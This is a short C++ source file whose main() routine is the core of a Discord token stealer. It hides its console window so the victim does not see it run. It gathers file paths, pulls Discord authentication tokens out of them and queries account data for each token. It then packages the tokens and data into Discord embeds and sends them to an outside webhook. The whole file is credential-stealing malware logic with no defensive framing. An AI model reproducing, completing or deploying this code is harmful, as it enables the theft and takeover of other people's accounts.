#include <iostream>
#include <vector>
#include <nlohmann/json.hpp>
#include <string>

#include "path.h"
#include "Web.h"
#include "Discord.h"

using json = nlohmann ::json;

int main(int argc, char *argv[])
{
	//FreeConsole();
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	std::vector<std::string> file_paths = path::get_paths();

	std::vector<std::string> tokens = path::extract_tokens(file_paths);

	for (auto &token : tokens)
	{
		json data = web::get_data_from_token(token);
		if (data.size())
		{
			json embed = discord::make_embed_fields(data, token);
			json discord_message = discord::make_discord_message(embed, data);
			web::send_to_webhook(discord_message.dump());
		}
	}

	return 0;
}
